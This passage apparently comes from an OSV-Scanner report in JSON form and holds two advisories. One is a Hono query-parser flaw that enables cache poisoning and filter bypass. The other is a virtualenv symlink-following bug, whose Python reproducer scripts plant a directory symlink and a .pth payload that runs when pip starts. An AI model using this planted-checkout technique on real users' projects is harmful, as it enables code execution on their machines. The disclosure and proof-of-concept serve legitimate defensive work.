                "markdown": "### Summary\n\nHono's query parsing does not stop at the URL fragment: a `?` appearing after a `#` is treated as the start of a query string. As a result, the application can read request parameters that no other component involved in handling the request can see.\n\n### Details\n\nA fragment is never part of the query, and every standard URL consumer — browsers, `new URL()`, reverse proxies — ignores everything from the first `#` onward. Hono's routing followed that rule; its query helpers did not.\n\nFor one and the same request, this produces an interpretation differential:\n\n- A component in front of the application that inspects the query string — filtering rules, parameter allow/deny lists, access logging — observes no parameters, while the application reads and acts on them.\n- The cache middleware removed the fragment when building its cache key, so a response influenced by parameters carried inside the fragment could be stored under a key that did not reflect them and later returned to other users.\n\nThe same divergence reaches request validation and any middleware that reads query parameters.\n\nThis requires a request target containing a literal `#` to reach the application. Deployments on runtimes that normalise such a target — including Cloudflare Workers — are not affected, and neither are those behind an intermediary that strips the fragment.\n\n### Impact\n\nAn attacker can cause the application to act on parameters that components in front of it never observe.\n\nThis may lead to:\n\n- filtering rules, allow/deny lists, and audit logging being blind to parameters the application still processes\n- a cached response being stored under a key that does not reflect the parameters used to produce it, and served to other users\n- stored cross-site scripting, where such a parameter is reflected into a cached HTML response without escaping\n\nThis issue affects applications that read query parameters and run on a runtime that passes a literal `#` through to the request URL.",
                "text": "### Summary\n\nHono's query parsing does not stop at the URL fragment: a `?` appearing after a `#` is treated as the start of a query string. As a result, the application can read request parameters that no other component involved in handling the request can see.\n\n### Details\n\nA fragment is never part of the query, and every standard URL consumer — browsers, `new URL()`, reverse proxies — ignores everything from the first `#` onward. Hono's routing followed that rule; its query helpers did not.\n\nFor one and the same request, this produces an interpretation differential:\n\n- A component in front of the application that inspects the query string — filtering rules, parameter allow/deny lists, access logging — observes no parameters, while the application reads and acts on them.\n- The cache middleware removed the fragment when building its cache key, so a response influenced by parameters carried inside the fragment could be stored under a key that did not reflect them and later returned to other users.\n\nThe same divergence reaches request validation and any middleware that reads query parameters.\n\nThis requires a request target containing a literal `#` to reach the application. Deployments on runtimes that normalise such a target — including Cloudflare Workers — are not affected, and neither are those behind an intermediary that strips the fragment.\n\n### Impact\n\nAn attacker can cause the application to act on parameters that components in front of it never observe.\n\nThis may lead to:\n\n- filtering rules, allow/deny lists, and audit logging being blind to parameters the application still processes\n- a cached response being stored under a key that does not reflect the parameters used to produce it, and served to other users\n- stored cross-site scripting, where such a parameter is reflected into a cached HTML response without escaping\n\nThis issue affects applications that read query parameters and run on a runtime that passes a literal `#` through to the request URL."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-84363](https://osv.dev/CVE-2026-84363)**.\n\n## [GHSA-crvj-82cr-hjcx](https://osv.dev/GHSA-crvj-82cr-hjcx)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e Hono's query parsing does not stop at the URL fragment: a `?` appearing after a `#` is treated as the start of a query string. As a result, the application can read request parameters that no other component involved in handling the request can see.\n\u003e \n\u003e ### Details\n\u003e \n\u003e A fragment is never part of the query, and every standard URL consumer — browsers, `new URL()`, reverse proxies — ignores everything from the first `#` onward. Hono's routing followed that rule; its query helpers did not.\n\u003e \n\u003e For one and the same request, this produces an interpretation differential:\n\u003e \n\u003e - A component in front of the application that inspects the query string — filtering rules, parameter allow/deny lists, access logging — observes no parameters, while the application reads and acts on them.\n\u003e - The cache middleware removed the fragment when building its cache key, so a response influenced by parameters carried inside the fragment could be stored under a key that did not reflect them and later returned to other users.\n\u003e \n\u003e The same divergence reaches request validation and any middleware that reads query parameters.\n\u003e \n\u003e This requires a request target containing a literal `#` to reach the application. Deployments on runtimes that normalise such a target — including Cloudflare Workers — are not affected, and neither are those behind an intermediary that strips the fragment.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e An attacker can cause the application to act on parameters that components in front of it never observe.\n\u003e \n\u003e This may lead to:\n\u003e \n\u003e - filtering rules, allow/deny lists, and audit logging being blind to parameters the application still processes\n\u003e - a cached response being stored under a key that does not reflect the parameters used to produce it, and served to other users\n\u003e - stored cross-site scripting, where such a parameter is reflected into a cached HTML response without escaping\n\u003e \n\u003e This issue affects applications that read query parameters and run on a runtime that passes a literal `#` through to the request URL.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | hono | 4.13.2 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-crvj-82cr-hjcx | hono | 4.13.5 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-84363\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-84363](https://osv.dev/CVE-2026-84363)**.\n\n## [GHSA-crvj-82cr-hjcx](https://osv.dev/GHSA-crvj-82cr-hjcx)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e Hono's query parsing does not stop at the URL fragment: a `?` appearing after a `#` is treated as the start of a query string. As a result, the application can read request parameters that no other component involved in handling the request can see.\n\u003e \n\u003e ### Details\n\u003e \n\u003e A fragment is never part of the query, and every standard URL consumer — browsers, `new URL()`, reverse proxies — ignores everything from the first `#` onward. Hono's routing followed that rule; its query helpers did not.\n\u003e \n\u003e For one and the same request, this produces an interpretation differential:\n\u003e \n\u003e - A component in front of the application that inspects the query string — filtering rules, parameter allow/deny lists, access logging — observes no parameters, while the application reads and acts on them.\n\u003e - The cache middleware removed the fragment when building its cache key, so a response influenced by parameters carried inside the fragment could be stored under a key that did not reflect them and later returned to other users.\n\u003e \n\u003e The same divergence reaches request validation and any middleware that reads query parameters.\n\u003e \n\u003e This requires a request target containing a literal `#` to reach the application. Deployments on runtimes that normalise such a target — including Cloudflare Workers — are not affected, and neither are those behind an intermediary that strips the fragment.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e An attacker can cause the application to act on parameters that components in front of it never observe.\n\u003e \n\u003e This may lead to:\n\u003e \n\u003e - filtering rules, allow/deny lists, and audit logging being blind to parameters the application still processes\n\u003e - a cached response being stored under a key that does not reflect the parameters used to produce it, and served to other users\n\u003e - stored cross-site scripting, where such a parameter is reflected into a cached HTML response without escaping\n\u003e \n\u003e This issue affects applications that read query parameters and run on a runtime that passes a literal `#` through to the request URL.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | hono | 4.13.2 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-crvj-82cr-hjcx | hono | 4.13.5 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-84363\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-84363",
              "name": "CVE-2026-84363",
              "properties": {
                "security-severity": "5.9"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-84363: Hono: Query parser reads parameters after the URL fragment, causing cache-key and proxy interpretation differentials",
                "text": "CVE-2026-84363: Hono: Query parser reads parameters after the URL fragment, causing cache-key and proxy interpretation differentials"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-113716",
                "GHSA-cw65-gx24-rc82"
              ],
              "fullDescription": {
                "markdown": "## Summary\n\nThe builtin creator accepts existing directory symlinks through ensure_dir() and writes environment files through those\ndirectories. This permits writes outside the requested destination.\n\nAnthropic's OSS Scanner reported this as `ANT-2026-MUFJEG11` in `virtualenv-20261015-005`, received on 15 October 2026.\n\n## Affected area\n\nDirectory preparation before environment files are created.\n\n## Attacker-controlled input\n\nAnother account must be able to prepare linked entries below the chosen destination before creation. The invoking user\nmust have access to the linked destination. This does not require write access to the target itself under the other\naccount.\n\n## Affected code\n\nThe relevant 21.14.8 source is in\n[builtin creator](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/via_global_ref/builtin/via_global_self_do.py),\n[ensure_dir()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).\n\n## Mechanism\n\nThe builtin creator calls `ensure_dir()` for `bin`, `lib`, and package directories. `ensure_dir()` accepts an existing\nsymlink to a directory because `exists()` follows it. Interpreter creation, seed installation, and activation-script\ngeneration then write through that parent link. A final-file check cannot prevent a write through a linked parent.\n`--clear` removes the planted tree first; ordinary creation over a prepared destination reaches it.\n\n## Reproduction and evidence\n\nThe scanner's project tree contains `venv/bin -\u003e ../../.local/bin` and a `.pth` file in the environment's package tree.\nWith the user's initially empty `~/.local/bin` first on `PATH`, `virtualenv venv` exited successfully and wrote\n`python*`, `pip*`, and `activate*` into `~/.local/bin`. The marker was absent immediately after creation; a later\n`pip --version` on the user's `PATH` loaded the seeded environment and the planted `.pth` code wrote the marker. A\nsecond case began with the `bin` link resolving inside the environment; replacement of a planted package link during\nseeding changed where it resolved, and writes again reached `~/.local/bin`.\n\nThe attacker must prepare entries in an existing destination. The `.pth` content is already attacker-controlled and\nwould run if the user used that environment directly; the added effect is creation-time writing or replacement outside\nthe requested tree and an executable on the user's `PATH` pointing at it. The scanner traces this default builtin path\nto 20.0.0b1. [PR #3429](https://github.com/pypa/virtualenv/pull/3429) replaces linked directory components before\ncreation. Concurrent parent replacement remains a separate case.\n\n## Attack sequence\n\n```mermaid\nsequenceDiagram\n    participant A as Prepared destination\n    participant V as Builtin creator\n    participant L as venv/bin symlink\n    participant H as ~/.local/bin\n    participant U as User\n    A-\u003e\u003eL: point to ../../.local/bin\n    V-\u003e\u003eL: ensure_dir accepts existing directory link\n    V-\u003e\u003eH: write python, pip and activate files through link\n    V--\u003e\u003eU: creation reports success\n    U-\u003e\u003eH: run pip found on PATH\n    H-\u003e\u003eA: interpreter loads planted .pth\n    A--\u003e\u003eU: marker created\n```\n\n## Reproducer files\n\nThe following files are from the scanner report for `ANT-2026-MUFJEG11`. They were tested against commit `a857a7823c73`\nin the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\nneed a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\nare included as evidence and were not rerun for this advisory update.\n\n**`repro`**\n\n```text\n#!/usr/bin/env python3\nimport os\nimport shutil\nimport subprocess\nimport sys\nfrom pathlib import Path\n\nWORK = Path(\"/tmp/planted-bin-link\")\nshutil.rmtree(WORK, ignore_errors=True)\n\n\ndef user_creates_venv_in_checkout_then_runs_pip(home, make_checkout):\n    local_bin = home / \".local/bin\"\n    user_env = {\"HOME\": str(home), \"PATH\": f\"{local_bin}:{os.environ['PATH']}\"}\n    local_bin_before = set(os.listdir(local_bin))\n    payload_marker = home / \"PWNED\"\n\n    # the attacker's checkout arrives at ~/project\n    subprocess.run([sys.executable, f\"/tmp/repro.d/{make_checkout}\", home / \"project\"], check=True)\n    venv = home / \"project/venv\"\n    print(f\"CONTROL  venv/bin before the run resolves to {os.path.realpath(venv / 'bin')}\")\n\n    # default options; the flag only keeps the run off the network\n    subprocess.run([\"virtualenv\", \"--no-periodic-update\", \"--quiet\", \"venv\"], cwd=home / \"project\", env=user_env, check=True)\n    written = sorted(set(os.listdir(local_bin)) - local_bin_before)\n    payload_ran_at_creation = payload_marker.exists()\n    print(f\"OBSERVED venv/bin after the run resolves to  {os.path.realpath(venv / 'bin')}\")\n    print(f\"OBSERVED virtualenv wrote to {local_bin}: {written}\")\n    print(f\"OBSERVED ~/PWNED exists after virtualenv: {payload_ran_at_creation}\")\n\n    # later, in another folder, the user runs pip\n    pip = subprocess.run([\"pip\", \"--version\"], cwd=home, env=user_env, capture_output=True, text=True)\n    print(f\"OBSERVED pip --version: {(pip.stdout + pip.stderr).strip()}\")\n    print(f\"OBSERVED ~/PWNED exists after pip: {payload_marker.exists()}\")\n    return written, payload_marker.exists() and not payload_ran_at_creation\n\n\nprint(\"--- checkout_with_bin_link.py: venv/bin -\u003e ../../.local/bin\")\nhome = WORK / \"bin-link\"\n(home / \".local/bin\").mkdir(parents=True)\nwritten_1, pip_ran_payload_1 = user_creates_venv_in_checkout_then_runs_pip(home, \"checkout_with_bin_link.py\")\n\nprint(\"--- checkout_with_bin_link_staying_inside.py: venv/bin resolves inside venv/ until pip is seeded\")\nhome = WORK / \"bin-link-staying-inside\"\n(home / \".local/bin\").mkdir(parents=True)\n# python is linked before the bin link leads out, so the pip written to ~/.local/bin needs the user's own python there\n(home / \".local/bin/python\").symlink_to(\"/usr/local/bin/python3\")\nwritten_2, pip_ran_payload_2 = user_creates_venv_in_checkout_then_runs_pip(home, \"checkout_with_bin_link_staying_inside.py\")\n\n# check: virtualenv must write nothing outside ~/project/venv, let alone a pip that runs the checkout's .pth\nplain_link_followed = {\"pip\", \"activate\"} \u003c= set(written_1) and pip_ran_payload_1\nlink_staying_inside_followed = {\"pip\", \"activate\"} \u003c= set(written_2) and pip_ran_payload_2\nprint(\"---\")\nprint(f\"OBSERVED first checkout: pip, activate written to ~/.local/bin and pip ran the payload: {plain_link_followed}\")\nprint(f\"OBSERVED second checkout: pip, activate written to ~/.local/bin and pip ran the payload: {link_staying_inside_followed}\")\nprint(\"BUG\" if plain_link_followed or link_staying_inside_followed else \"OK\")\n```\n\n**`repro.d/checkout_with_bin_link.py`**\n\n```text\nimport sys\nfrom pathlib import Path\n\nvenv = Path(sys.argv[1]) / \"venv\"\n\n# one per minor version: the attacker does not know which Python the user has\nfor minor in range(9, 20):\n    site_packages = venv / f\"lib/python3.{minor}/site-packages\"\n    site_packages.mkdir(parents=True)\n    (site_packages / \"payload.pth\").write_text(\"import os; open(os.path.expanduser('~/PWNED'), 'w').write(os.getcwd())\\n\")\n\n# relative to a checkout at ~/project\n(venv / \"bin\").symlink_to(\"../../.local/bin\")\n```\n\n**`repro.d/checkout_with_bin_link_staying_inside.py`**\n\n```text\nimport sys\nfrom pathlib import Path\n\nvenv = Path(sys.argv[1]) / \"venv\"\n\nsite_packages = venv / \"lib/py/site-packages\"\nsite_packages.mkdir(parents=True)\n(site_packages / \"payload.pth\").write_text(\"import os; open(os.path.expanduser('~/PWNED'), 'w').write(os.getcwd())\\n\")\nfor minor in range(9, 20):\n    (venv / f\"lib/python3.{minor}\").symlink_to(\"py\")\n\n# pip -\u003e a folder 7 levels below venv/; the real pip folder the seeder puts in its place is only 4 levels below\n(venv / \"1/2/3/4/5/6/7\").mkdir(parents=True)\n(site_packages / \"pip\").symlink_to(\"../../../1/2/3/4/5/6/7\")\n\n# six levels up from venv/1/2/3/4/5/6/7 is venv/1; six levels up from ~/project/venv/lib/py/site-packages/pip is ~\n(venv / \"1/.local/bin\").mkdir(parents=True)\n(venv / \"bin\").symlink_to(\"lib/py/site-packages/pip\" + \"/..\" * 6 + \"/.local/bin\")\n```\n\n## Impact\n\nCreation can place or replace environment files outside the selected tree. The written bytes are environment-creation\noutput; arbitrary attacker-selected file contents are not established.\n\nSeverity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.\n\n## Versions tested\n\nThe confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\nversion or exclude earlier releases. Fixed in 21.14.9.\n\nThe fix removes pre-existing symbolic links and Windows junctions along executable and library directory paths.\nEach replacement is created immediately, and an existing entry must be a real directory. A warning names each replaced\nlink or junction. Directories can still be replaced after preparation; this does not protect against concurrent tree\nreplacement.\n\nFix: [PR #3429](https://github.com/pypa/virtualenv/pull/3429).\n\n## Known mitigation\n\nCreate environments in fresh directories beneath a parent controlled only by their owner. Do not reuse trees prepared by\nanother account.\n\n## Affected release\n\n- [x] The problem reproduces on virtualenv 21.14.8.\n\n## Credits\n\nReported by Anthropic's OSS Scanner as ANT-2026-MUFJEG11.",
                "text": "## Summary\n\nThe builtin creator accepts existing directory symlinks through ensure_dir() and writes environment files through those\ndirectories. This permits writes outside the requested destination.\n\nAnthropic's OSS Scanner reported this as `ANT-2026-MUFJEG11` in `virtualenv-20261015-005`, received on 15 October 2026.\n\n## Affected area\n\nDirectory preparation before environment files are created.\n\n## Attacker-controlled input\n\nAnother account must be able to prepare linked entries below the chosen destination before creation. The invoking user\nmust have access to the linked destination. This does not require write access to the target itself under the other\naccount.\n\n## Affected code\n\nThe relevant 21.14.8 source is in\n[builtin creator](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/via_global_ref/builtin/via_global_self_do.py),\n[ensure_dir()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).\n\n## Mechanism\n\nThe builtin creator calls `ensure_dir()` for `bin`, `lib`, and package directories. `ensure_dir()` accepts an existing\nsymlink to a directory because `exists()` follows it. Interpreter creation, seed installation, and activation-script\ngeneration then write through that parent link. A final-file check cannot prevent a write through a linked parent.\n`--clear` removes the planted tree first; ordinary creation over a prepared destination reaches it.\n\n## Reproduction and evidence\n\nThe scanner's project tree contains `venv/bin -\u003e ../../.local/bin` and a `.pth` file in the environment's package tree.\nWith the user's initially empty `~/.local/bin` first on `PATH`, `virtualenv venv` exited successfully and wrote\n`python*`, `pip*`, and `activate*` into `~/.local/bin`. The marker was absent immediately after creation; a later\n`pip --version` on the user's `PATH` loaded the seeded environment and the planted `.pth` code wrote the marker. A\nsecond case began with the `bin` link resolving inside the environment; replacement of a planted package link during\nseeding changed where it resolved, and writes again reached `~/.local/bin`.\n\nThe attacker must prepare entries in an existing destination. The `.pth` content is already attacker-controlled and\nwould run if the user used that environment directly; the added effect is creation-time writing or replacement outside\nthe requested tree and an executable on the user's `PATH` pointing at it. The scanner traces this default builtin path\nto 20.0.0b1. [PR #3429](https://github.com/pypa/virtualenv/pull/3429) replaces linked directory components before\ncreation. Concurrent parent replacement remains a separate case.\n\n## Attack sequence\n\n```mermaid\nsequenceDiagram\n    participant A as Prepared destination\n    participant V as Builtin creator\n    participant L as venv/bin symlink\n    participant H as ~/.local/bin\n    participant U as User\n    A-\u003e\u003eL: point to ../../.local/bin\n    V-\u003e\u003eL: ensure_dir accepts existing directory link\n    V-\u003e\u003eH: write python, pip and activate files through link\n    V--\u003e\u003eU: creation reports success\n    U-\u003e\u003eH: run pip found on PATH\n    H-\u003e\u003eA: interpreter loads planted .pth\n    A--\u003e\u003eU: marker created\n```\n\n## Reproducer files\n\nThe following files are from the scanner report for `ANT-2026-MUFJEG11`. They were tested against commit `a857a7823c73`\nin the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\nneed a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\nare included as evidence and were not rerun for this advisory update.\n\n**`repro`**\n\n```text\n#!/usr/bin/env python3\nimport os\nimport shutil\nimport subprocess\nimport sys\nfrom pathlib import Path\n\nWORK = Path(\"/tmp/planted-bin-link\")\nshutil.rmtree(WORK, ignore_errors=True)\n\n\ndef user_creates_venv_in_checkout_then_runs_pip(home, make_checkout):\n    local_bin = home / \".local/bin\"\n    user_env = {\"HOME\": str(home), \"PATH\": f\"{local_bin}:{os.environ['PATH']}\"}\n    local_bin_before = set(os.listdir(local_bin))\n    payload_marker = home / \"PWNED\"\n\n    # the attacker's checkout arrives at ~/project\n    subprocess.run([sys.executable, f\"/tmp/repro.d/{make_checkout}\", home / \"project\"], check=True)\n    venv = home / \"project/venv\"\n    print(f\"CONTROL  venv/bin before the run resolves to {os.path.realpath(venv / 'bin')}\")\n\n    # default options; the flag only keeps the run off the network\n    subprocess.run([\"virtualenv\", \"--no-periodic-update\", \"--quiet\", \"venv\"], cwd=home / \"project\", env=user_env, check=True)\n    written = sorted(set(os.listdir(local_bin)) - local_bin_before)\n    payload_ran_at_creation = payload_marker.exists()\n    print(f\"OBSERVED venv/bin after the run resolves to  {os.path.realpath(venv / 'bin')}\")\n    print(f\"OBSERVED virtualenv wrote to {local_bin}: {written}\")\n    print(f\"OBSERVED ~/PWNED exists after virtualenv: {payload_ran_at_creation}\")\n\n    # later, in another folder, the user runs pip\n    pip = subprocess.run([\"pip\", \"--version\"], cwd=home, env=user_env, capture_output=True, text=True)\n    print(f\"OBSERVED pip --version: {(pip.stdout + pip.stderr).strip()}\")\n    print(f\"OBSERVED ~/PWNED exists after pip: {payload_marker.exists()}\")\n    return written, payload_marker.exists() and not payload_ran_at_creation\n\n\nprint(\"--- checkout_with_bin_link.py: venv/bin -\u003e ../../.local/bin\")\nhome = WORK / \"bin-link\"\n(home / \".local/bin\").mkdir(parents=True)\nwritten_1, pip_ran_payload_1 = user_creates_venv_in_checkout_then_runs_pip(home, \"checkout_with_bin_link.py\")\n\nprint(\"--- checkout_with_bin_link_staying_inside.py: venv/bin resolves inside venv/ until pip is seeded\")\nhome = WORK / \"bin-link-staying-inside\"\n(home / \".local/bin\").mkdir(parents=True)\n# python is linked before the bin link leads out, so the pip written to ~/.local/bin needs the user's own python there\n(home / \".local/bin/python\").symlink_to(\"/usr/local/bin/python3\")\nwritten_2, pip_ran_payload_2 = user_creates_venv_in_checkout_then_runs_pip(home, \"checkout_with_bin_link_staying_inside.py\")\n\n# check: virtualenv must write nothing outside ~/project/venv, let alone a pip that runs the checkout's .pth\nplain_link_followed = {\"pip\", \"activate\"} \u003c= set(written_1) and pip_ran_payload_1\nlink_staying_inside_followed = {\"pip\", \"activate\"} \u003c= set(written_2) and pip_ran_payload_2\nprint(\"---\")\nprint(f\"OBSERVED first checkout: pip, activate written to ~/.local/bin and pip ran the payload: {plain_link_followed}\")\nprint(f\"OBSERVED second checkout: pip, activate written to ~/.local/bin and pip ran the payload: {link_staying_inside_followed}\")\nprint(\"BUG\" if plain_link_followed or link_staying_inside_followed else \"OK\")\n```\n\n**`repro.d/checkout_with_bin_link.py`**\n\n```text\nimport sys\nfrom pathlib import Path\n\nvenv = Path(sys.argv[1]) / \"venv\"\n\n# one per minor version: the attacker does not know which Python the user has\nfor minor in range(9, 20):\n    site_packages = venv / f\"lib/python3.{minor}/site-packages\"\n    site_packages.mkdir(parents=True)\n    (site_packages / \"payload.pth\").write_text(\"import os; open(os.path.expanduser('~/PWNED'), 'w').write(os.getcwd())\\n\")\n\n# relative to a checkout at ~/project\n(venv / \"bin\").symlink_to(\"../../.local/bin\")\n```\n\n**`repro.d/checkout_with_bin_link_staying_inside.py`**\n\n```text\nimport sys\nfrom pathlib import Path\n\nvenv = Path(sys.argv[1]) / \"venv\"\n\nsite_packages = venv / \"lib/py/site-packages\"\nsite_packages.mkdir(parents=True)\n(site_packages / \"payload.pth\").write_text(\"import os; open(os.path.expanduser('~/PWNED'), 'w').write(os.getcwd())\\n\")\nfor minor in range(9, 20):\n    (venv / f\"lib/python3.{minor}\").symlink_to(\"py\")\n\n# pip -\u003e a folder 7 levels below venv/; the real pip folder the seeder puts in its place is only 4 levels below\n(venv / \"1/2/3/4/5/6/7\").mkdir(parents=True)\n(site_packages / \"pip\").symlink_to(\"../../../1/2/3/4/5/6/7\")\n\n# six levels up from venv/1/2/3/4/5/6/7 is venv/1; six levels up from ~/project/venv/lib/py/site-packages/pip is ~\n(venv / \"1/.local/bin\").mkdir(parents=True)\n(venv / \"bin\").symlink_to(\"lib/py/site-packages/pip\" + \"/..\" * 6 + \"/.local/bin\")\n```\n\n## Impact\n\nCreation can place or replace environment files outside the selected tree. The written bytes are environment-creation\noutput; arbitrary attacker-selected file contents are not established.\n\nSeverity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.\n\n## Versions tested\n\nThe confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\nversion or exclude earlier releases. Fixed in 21.14.9.\n\nThe fix removes pre-existing symbolic links and Windows junctions along executable and library directory paths.\nEach replacement is created immediately, and an existing entry must be a real directory. A warning names each replaced\nlink or junction. Directories can still be replaced after preparation; this does not protect against concurrent tree\nreplacement.\n\nFix: [PR #3429](https://github.com/pypa/virtualenv/pull/3429).\n\n## Known mitigation\n\nCreate environments in fresh directories beneath a parent controlled only by their owner. Do not reuse trees prepared by\nanother account.\n\n## Affected release\n\n- [x] The problem reproduces on virtualenv 21.14.8.\n\n## Credits\n\nReported by Anthropic's OSS Scanner as ANT-2026-MUFJEG11."
